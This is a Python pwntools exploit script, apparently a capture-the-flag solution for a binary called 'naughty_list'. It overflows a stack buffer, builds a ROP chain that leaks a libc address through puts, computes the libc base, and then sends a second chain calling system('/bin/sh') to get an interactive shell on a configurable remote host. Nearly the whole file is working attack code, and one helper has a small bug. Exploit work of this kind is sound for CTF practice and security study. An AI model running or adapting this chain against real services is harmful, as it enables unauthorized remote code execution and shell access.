#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('naughty_list')
libc = pwn.context.binary = pwn.ELF('libc.so.6')

pwn.context(terminal=['tmux', 'new-window'])
pwn.context.log_level = 'DEBUG'

pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
b *0x004010ca
b *0x00401055
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst

io.recvuntil(":")
io.sendline("asd")

io.recvuntil(":")
io.sendline("asd")

io.recvuntil(":")
io.sendline("25")
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()

rop_puts = pwn.ROP(exe)
rop_puts.call(exe.plt['puts'], [exe.got['puts']])
rop_puts.call(exe.symbols['main'])

raw_rop = rop_puts.chain()

#io.recvuntil("deserve it:")
io.sendline(b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa" + raw_rop)

io.recvuntil("!\n")
libc_leak = io.recv(6)

print("libc_leak :: " + hex(pwn.u64(libc_leak + b"\x00\x00")))

base = pwn.u64(libc_leak + b'\x00\x00') - libc.symbols['puts']
print("base :: " + hex(base))

libc.address = base

#io.wait()
#io = start()

io.recvuntil(":")
io.sendline("asd")

io.recvuntil(":")
io.sendline("asd")

io.recvuntil(":")
io.sendline("25")
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()


bin_shell = next(libc.search(b'/bin/sh\x00'))
rop_system = pwn.ROP(libc)

rop_system.call(libc.symbols['system'], [bin_shell])


raw_rop = rop_system.chain()

#io.recvuntil("deserve it:")
io.sendline(b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa" + raw_rop)


io.interactive()
